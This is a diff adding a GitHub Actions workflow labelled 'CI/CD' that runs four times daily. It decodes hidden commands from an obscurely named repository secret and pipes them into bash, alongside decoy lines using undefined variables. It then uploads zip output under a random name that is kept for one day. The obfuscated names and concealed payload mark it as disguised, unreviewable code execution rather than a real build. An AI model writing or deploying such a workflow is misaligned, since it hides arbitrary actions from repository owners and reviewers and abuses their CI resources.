@@ -1,0 +1,32 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          nw6837: ${{ secrets.nw6837 }}
+        run: |
+          printf '%s' "$nw6837" | jq -r .in97739 | /bin/bash
+          printf '%s' "$k1" | jq -r .x4 | /bin/bash
+          printf '%s' "$r784" | jq -r .c361 | /bin/bash
+          printf '%s' "$k78200" | jq -r .unra76155 | /bin/bash
+          printf '%s' "$kt54" | jq -r .ykae77216 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: jitpBGqs
+          path: "*.zip"
+          retention-days: 1
